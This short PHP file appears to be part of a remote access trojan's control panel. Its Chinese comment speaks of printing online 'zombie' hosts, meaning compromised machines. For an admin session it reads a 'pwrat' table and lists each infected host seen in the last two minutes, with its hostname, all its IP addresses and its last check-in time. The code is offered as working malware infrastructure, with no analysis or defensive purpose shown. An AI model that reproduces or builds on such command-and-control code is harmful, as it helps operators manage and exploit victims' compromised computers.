<?php
require("dbconn.php");


if (isset($_SESSION["admin"]))
{
	echo '<div id="table">';
	echo '<table>';
	echo '<th>id</th><th>HostName</th><th>all IP(including lan,ipv4,ipv6)</th><th>Recent online time</th>';
	
//检查并打印在线肉鸡
	$timenow = time();
	$result = $mysqli->query("SELECT * FROM pwrat");
	while($row = $result->fetch_assoc())
	{
			$lasttime = $row["lasttime"];
			if (($timenow - strtotime($lasttime)) <= 120)
			{
				echo '<tr>';
				echo '<td>'.$row["id"].'</td>';
				echo '<td>'.$row["name"].'</td>';
				echo '<td>'.$row["IP"].'</td>';
				echo '<td>'.$row["lasttime"].'</td>';
				echo '</tr>';
			}
	}
	echo '</table></div>';
	$result->close();
}

$mysqli->close();
?>